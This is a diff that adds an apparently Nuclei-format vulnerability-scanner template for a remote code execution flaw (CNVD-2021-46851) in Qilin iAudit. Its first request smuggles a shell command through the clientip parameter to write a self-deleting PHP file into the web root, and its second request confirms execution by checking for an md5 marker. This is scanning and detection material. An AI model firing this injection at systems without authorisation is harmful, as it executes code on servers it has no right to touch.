@@ -1,0 +1,36 @@
+id: CNVD-2021-46851
+info:
+  name: Qilin iAudit RCE
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    iAudit fortress aircraft remote code execution vulnerability. This template exploits the vulnerability by uploading a temporary harmless file with self-deletion logic.
+    Note: The script attempts self-deletion but may fail.
+
+variables:
+  r2: '{{rand_text_alpha(10)}}'
+
+http:
+  - id: "1"
+    method: GET
+    path:
+      - "{{BaseURL}}/get_luser_by_sshport.php?clientip=1;echo%20\"<?php%20echo%20md5({{r2}});unlink(__FILE__);?>\">/opt/freesvr/web/htdocs/freesvr/audit/{{r2}}.php;&clientport=1"
+    redirects: false
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: "2"
+    method: GET
+    path:
+      - "{{BaseURL}}/{{r2}}.php"
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{md5(r2)}}"
